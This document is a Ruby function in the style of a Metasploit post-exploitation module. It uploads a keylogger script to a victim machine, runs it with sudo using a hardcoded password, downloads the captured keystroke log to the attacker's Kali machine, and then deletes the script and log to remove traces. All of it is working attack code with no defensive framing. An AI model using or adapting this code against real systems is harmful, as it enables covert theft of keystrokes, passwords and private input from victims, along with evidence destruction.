def run_script(client)
# Define paths for the keylogger script and log file
local_keylogger_script = "/home/kali/Documents/keylogger.sh" # Local path on attacker machine
remote_keylogger_script = "/tmp/keylogger.sh"               # Remote path on victim machine
log_file_path = "/tmp/keyboard_log.txt"                     # Log file on victim machine
download_path = "/home/kali/Documents/keyboard_log.txt"     # Local path to save downloaded log file
sudo_password = "kali"                                      # Sudo password for victim machine

# Step 1: Upload the keylogger script to the victim machine
print_status("Uploading keylogger script to the victim machine...")
if File.exist?(local_keylogger_script)
  session.fs.file.upload_file(remote_keylogger_script, local_keylogger_script)
  print_good("Keylogger script uploaded successfully.")
else
  print_error("Keylogger script does not exist on the attacker machine.")
  return
end

# Step 2: Set the uploaded script as executable
print_status("Setting execute permissions for the uploaded script...")
cmd_exec("chmod +x #{remote_keylogger_script}")

# Step 3: Execute the keylogger script on the victim machine with sudo
print_status("Executing the keylogger script on the victim machine...")
remote_command = "echo '#{sudo_password}' | sudo -S bash #{remote_keylogger_script}"
output = cmd_exec(remote_command)

if output.nil? || output.empty?
  print_error("Failed to execute the script with sudo. Check permissions or script content.")
  return
else
  print_good("Keylogger script executed successfully with sudo.")
  print_line("Output: #{output}")
end

# Step 4: Check for and download the log file
print_status("Checking for the key log file on the victim machine...")
if session.fs.file.exist?(log_file_path)
  print_status("Downloading the key log file...")
  session.fs.file.download_file(download_path, log_file_path)
  print_good("Key log file downloaded successfully to #{download_path}.")
else
  print_error("Log file not found on the victim machine. Check the script execution.")
  return
end

# Step 5: Clean up by removing the uploaded script and log file
print_status("Cleaning up uploaded files...")
cmd_exec("echo '#{sudo_password}' | sudo -S rm -f #{remote_keylogger_script} #{log_file_path}")
print_good("Uploaded script and log file cleaned up successfully.")
end
